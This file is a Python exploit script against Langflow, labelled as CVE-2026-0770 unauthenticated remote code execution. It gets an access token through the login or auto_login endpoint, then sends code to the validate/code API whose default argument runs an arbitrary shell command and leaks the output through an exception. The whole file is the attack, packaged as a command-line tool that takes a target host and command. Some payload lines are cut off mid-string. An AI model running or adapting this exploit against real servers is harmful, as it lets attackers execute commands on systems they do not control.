import httpx
import asyncio
import subprocess
import json
import sys
import argparse
def auth(host, username, password):
    with httpx.Client(verify=False) as client:
        data = {
            'username': username,
            'password': password
        }
        r = client.post(url=f'http://{host}:7860/api/v1/login', data=data)
        res = r.json()
        access_token = res["access_token"]

    return access_token

async def exec_auth(host, username, password, cmd):
    async with httpx.AsyncClient(verify=False) as client:
        headers = {
            'Authorization': f'Bearare {auth(host, username, password)}'
        }

        data = {
            "code":"\ndef exploit(\n    _=( lambda r: (_ for _ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n        __import__('subprocess').run('%s', shell=True, cap>
        }

        r = await client.post(url=f'http://{host}:7860/api/v1/validate/code', headers=headers, json=data)
        r_out = r.text
        output = json.loads(r_out)
        value = output['function']
        try:
            print(value['errors'][0])
        except IndexError:
            print("Index out of range")
async def exec_without_auth(host, cmd):
    async with httpx.AsyncClient(verify=False) as client:
        req = await client.get(url=f'http://{host}:7860/api/v1/auto_login')
        res = req.json()
        access_token = res["access_token"]
        headers = {
            'Authorization': f'Bearare {access_token}'
        }
        data = {
            "code":"\ndef exploit(\n    _=( lambda r: (_ for _ in ()).throw(Exception(f\"{r.stdout}{r.stderr}\")) )(\n        __import__('subprocess').run('%s', shell=True, cap>
        }
        r = await client.post(url=f'http://{host}:7860/api/v1/validate/code', headers=headers, json=data)
        r_out = r.text
        output = json.loads(r_out)
        value = output['function']
        try:
            print(value['errors'][0])
        except IndexError:
            print("Index out of range")
parser = argparse.ArgumentParser(description="Exploit for CVE-2026-0770 – Unauthenticated RCE in Langflow")
parser.add_argument('-u', '--host', required=True, help="Target host, e.g 127.0.0.1")
parser.add_argument('-l', '--login', help="Username for login, e.g user (If auto login not enabled)")
parser.add_argument('-p', '--password', help="Password for login, e.g password (If auto login not enabled)")
parser.add_argument('-c', '--command', default='id', help="Command for execute, e.g id, default: id")
args = parser.parse_args()
if args.login and args.password:
    asyncio.run(exec_auth(args.host, args.login, args.password, args.command))
else:
    asyncio.run(exec_without_auth(args.host, args.command))
